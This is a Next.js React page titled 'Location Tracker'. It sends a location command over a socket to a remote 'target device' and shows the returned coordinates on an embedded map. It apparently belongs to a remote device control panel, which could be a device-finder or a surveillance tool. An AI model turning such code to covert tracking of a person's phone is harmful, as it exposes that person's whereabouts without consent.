'use client';

import { useState, useEffect } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import { useNotification } from '@/context/NotificationProvider';
import { initSocket, sendCommand, onResult, COMMANDS, disconnectSocket, SocketResult } from '@/lib/socket';
import { MapPin, ArrowLeft, RefreshCw } from 'lucide-react';

export default function LocationPage() {
    const searchParams = useSearchParams();
    const router = useRouter();
    const { showSuccess, showError, showWarning, showConnection } = useNotification();

    const deviceName = searchParams.get('name') || 'Device';
    const deviceId = searchParams.get('deviceId') || '';

    const [location, setLocation] = useState<{ lat: number; lng: number } | null>(null);
    const [isLoading, setIsLoading] = useState(false);
    const [errorMessage, setErrorMessage] = useState<string | null>(null);

    useEffect(() => {
        initSocket(deviceId);
        showConnection(true, 'Connected to location server');

        onResult((data: SocketResult) => {
            setIsLoading(false);

            if (data.enable || data.success) {
                const lat = data.latitude ?? data.lat;
                const lng = data.longitude ?? data.lng;

                if ((lat === 0 && lng === 0) || lat === undefined || lng === undefined) {
                    setErrorMessage('Invalid location received. Try refreshing.');
                    showWarning('Invalid Location', 'Received invalid coordinates. Please try refreshing.');
                } else {
                    setLocation({ lat, lng });
                    setErrorMessage(null);
                    showSuccess('Location Updated', `Location found: ${lat.toFixed(4)}, ${lng.toFixed(4)}`);
                }
            } else {
                setErrorMessage('Location service is not enabled on the device.');
                showWarning('Location Disabled', 'Location service is not enabled on the target device.');
            }
        });

        return () => disconnectSocket();
    }, [deviceId]);

    const handleRefresh = () => {
        setIsLoading(true);
        setErrorMessage(null);
        sendCommand({
            userId: deviceId,
            command: { order: COMMANDS.LOCATION },
        });
    };

    const mapUrl = location
        ? `https://www.google.com/maps?q=${location.lat},${location.lng}&z=18&output=embed`
        : null;

    return (
        <div className="max-w-4xl mx-auto">
            {/* Header */}
            <div className="gradient-border mb-6">
                <div className="bg-[#1a0b2e] rounded-[1.15rem] p-6">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-4">
                            <button onClick={() => router.back()} className="p-2 rounded-xl bg-purple-500/15">
                                <ArrowLeft className="w-5 h-5 text-purple-400" />
                            </button>
                            <div>
                                <h1 className="text-2xl font-bold text-white">Location Tracker</h1>
                                <p className="text-gray-400">{deviceName}</p>
                            </div>
                        </div>
                        <div className="w-14 h-14 rounded-full bg-white/10 flex items-center justify-center">
                            <MapPin className="w-7 h-7 text-white" />
                        </div>
                    </div>
                </div>
            </div>

            {/* Map Container */}
            <div className="ms-card overflow-hidden mb-6" style={{ height: '50vh', minHeight: '400px' }}>
                {location && mapUrl ? (
                    <iframe
                        src={mapUrl}
                        width="100%"
                        height="100%"
                        style={{ border: 0 }}
                        allowFullScreen
                        loading="lazy"
                        referrerPolicy="no-referrer-when-downgrade"
                    />
                ) : (
                    <div className="h-full flex flex-col items-center justify-center p-8">
                        {isLoading ? (
                            <>
                                <div className="w-12 h-12 border-2 border-orange-500/30 border-t-orange-500 rounded-full animate-spin mb-4" />
                                <p className="text-white font-semibold">Fetching location...</p>
                            </>
                        ) : (
                            <>
                                <MapPin className="w-16 h-16 text-gray-600 mb-4" />
                                <p className="text-white text-center">
                                    {errorMessage || 'Location not available. Press "Refresh Location" to fetch.'}
                                </p>
                            </>
                        )}
                    </div>
                )}
            </div>

            {/* Coordinates Display */}
            {location && (
                <div className="ms-card p-4 mb-6">
                    <p className="text-gray-400 text-sm mb-1">Coordinates</p>
                    <p className="text-white font-mono">
                        {location.lat.toFixed(6)}, {location.lng.toFixed(6)}
                    </p>
                </div>
            )}

            {/* Refresh Button */}
            <button
                onClick={handleRefresh}
                disabled={isLoading}
                className={`w-full py-4 rounded-xl font-bold text-lg flex items-center justify-center gap-3 ${isLoading
                        ? 'bg-gray-600 text-gray-300'
                        : 'bg-orange-500 hover:bg-orange-600 text-white'
                    }`}
            >
                <RefreshCw className={`w-5 h-5 ${isLoading ? 'animate-spin' : ''}`} />
                {isLoading ? 'Fetching...' : 'Refresh Location'}
            </button>
        </div>
    );
}
